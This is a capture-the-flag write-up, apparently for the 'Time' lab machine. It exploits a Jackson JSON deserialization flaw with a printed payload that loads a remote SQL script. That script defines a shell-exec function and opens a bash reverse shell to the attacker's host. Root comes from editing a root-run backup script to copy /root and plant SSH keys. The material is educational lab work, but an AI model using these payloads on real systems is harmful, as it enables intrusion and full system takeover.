port 22,80 open

Port 80,input text into validate field
```
validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException:
```
After googling, a CVE for jackson lib of Java
> https://github.com/tzwlhack/Vulnerability/blob/main/CVE-2019-12384%20jackson%20ssrf-rce(%E9%99%84exp%E8%84%9A%E6%9C%AC).md

The payload is :
`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.16.2/exp.sql'"}]  `

`└─$ cat exp.sql `
```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"')
```
set a http server on kali for taregt host download exp.sql and trigger the reverseshell
`└─$ nc -nvlp 443`
```
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.214] 47730
bash: cannot set terminal process group (935): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
```
After linpeas, notice a sh file is owned by user
`pericles@time:/var/www/html/vendor$ cat /usr/bin/timer_backup.sh`
```
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
```
```
pericles@time:/tmp$ chmod +x pspy64 
pericles@time:/tmp$ ./pspy64 
```
```
2025/12/31 17:20:31 CMD: UID=0     PID=193858 | zip -r website.bak.zip /var/www/html 
2025/12/31 17:20:31 CMD: UID=0     PID=193857 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:31 CMD: UID=0     PID=193856 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:31 CMD: UID=0     PID=193855 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:31 CMD: UID=0     PID=193854 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:31 CMD: UID=0     PID=193859 | /bin/bash /usr/bin/timer_backup.sh 
2025/12/31 17:20:41 CMD: UID=0     PID=193865 | /usr/bin/systemctl restart web_backup.service 
2025/12/31 17:20:41 CMD: UID=0     PID=193887 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:41 CMD: UID=0     PID=193886 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:41 CMD: UID=0     PID=193885 | zip -r website.bak.zip /var/www/html 
2025/12/31 17:20:41 CMD: UID=0     PID=193884 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:41 CMD: UID=0     PID=193883 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:41 CMD: UID=0     PID=193882 | /lib/systemd/systemd-udevd 
2025/12/31 17:20:41 CMD: UID=0     PID=193881 | /bin/bash /usr/bin/timer_backup.sh 
```
check the process, this 'timer_backup.sh' is repeatly executed by UID 0, that is root.
modify this sh, to zip /root folder to tmp, and unzip it
`pericles@time:/tmp$ unzip root.bak`
```
Archive:  root.bak
   creating: root/
  inflating: root/.viminfo           
  inflating: root/.bashrc            
  inflating: root/.selected_editor   
 extracting: root/root.txt           
   creating: root/.ssh/
 extracting: root/.ssh/authorized_keys  
  inflating: root/.profile           
  inflating: root/timer_backup.sh    
 extracting: root/backup.zip         
   creating: root/.config/
   creating: root/.config/procps/
   creating: root/.local/
   creating: root/.local/share/
   creating: root/.local/share/nano/
   creating: root/snap/
   creating: root/snap/lxd/
   creating: root/snap/lxd/17886/
   creating: root/snap/lxd/common/
   creating: root/snap/lxd/current/
   creating: root/snap/lxd/17936/
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed 
```

`pericles@time:/tmp/root/.ssh$ ls -la`
```
total 8
drwx------ 2 pericles pericles 4096 Feb 10  2021 .
drwx------ 7 pericles pericles 4096 Dec 31 17:24 ..
-rw------- 1 pericles pericles    0 Sep 20  2020 authorized_keys
```
since we have the dir map of /root, we can echo pub key to root - authorized_keys, or set reverse shell command directly to timer_backup

For the routine task, we can also check the systemd of services running on this host, double check of the routine task
`pericles@time:/etc/systemd/system$ ls -l`
```
ls -l
total 108
drwxr-xr-x 2 root root 4096 Dec 16  2021 cloud-final.service.wants
lrwxrwxrwx 1 root root   44 Apr 23  2020 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
lrwxrwxrwx 1 root root   36 Sep 20  2020 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
lrwxrwxrwx 1 root root   45 Apr 23  2020 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
drwxr-xr-x 2 root root 4096 Dec 16  2021 default.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 emergency.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 final.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 getty.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 graphical.target.wants
lrwxrwxrwx 1 root root   38 Apr 23  2020 iscsi.service -> /lib/systemd/system/open-iscsi.service
drwxr-xr-x 2 root root 4096 Dec 16  2021 mdmonitor.service.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 multi-user.target.wants
lrwxrwxrwx 1 root root   38 Apr 23  2020 multipath-tools.service -> /lib/systemd/system/multipathd.service
lrwxrwxrwx 1 root root    9 Oct 22  2020 mysql.service -> /dev/null
drwxr-xr-x 2 root root 4096 Dec 16  2021 network-online.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 open-vm-tools.service.requires
drwxr-xr-x 2 root root 4096 Dec 16  2021 paths.target.wants
drwxr-xr-x 2 root root 4096 Dec 16  2021 rescue.target.wants
-rw-r--r-- 1 root root  249 Sep 20  2020 snap-core18-1705.mount
-rw-r--r-- 1 root root  249 Sep 21  2020 snap-core18-1885.mount
-rw-r--r-- 1 root root  243 Oct 20  2020 snap-lxd-17886.mount
-rw-r--r-- 1 root root  243 Oct 22  2020 snap-lxd-17936.mount
-rw-r--r-- 1 root root  246 Oct 20  2020 snap-snapd-9607.mount
-rw-r--r-- 1 root root  246 Oct 22  2020 snap-snapd-9721.mount
-rw-r--r-- 1 root root  453 Oct 22  2020 snap.lxd.activate.service
-rw-r--r-- 1 root root  527 Oct 22  2020 snap.lxd.daemon.service
-rw-r--r-- 1 root root  330 Oct 22  2020 snap.lxd.daemon.unix.socket
drwxr-xr-x 2 root root 4096 Dec 16  2021 sockets.target.wants
lrwxrwxrwx 1 root root   31 Sep 20  2020 sshd.service -> /lib/systemd/system/ssh.service
drwxr-xr-x 2 root root 4096 Dec 16  2021 sysinit.target.wants
lrwxrwxrwx 1 root root   35 Apr 23  2020 syslog.service -> /lib/systemd/system/rsyslog.service
-rw-r--r-- 1 root root  159 Oct 23  2020 timer_backup.service
-rw-r--r-- 1 root root  214 Oct 23  2020 timer_backup.timer
drwxr-xr-x 2 root root 4096 Dec 16  2021 timers.target.wants
lrwxrwxrwx 1 root root   41 Apr 23  2020 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
-rw-r--r-- 1 root root  106 Oct 23  2020 web_backup.service
```

`pericles@time:/etc/systemd/system$ cat timer_backup.service`
```
cat timer_backup.service
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
```

#### lesson learned
- check the reponse of error to indentify the framework, dev language, lib used etc.
- when trigger revershell, it is alwasys good to use ping to check first
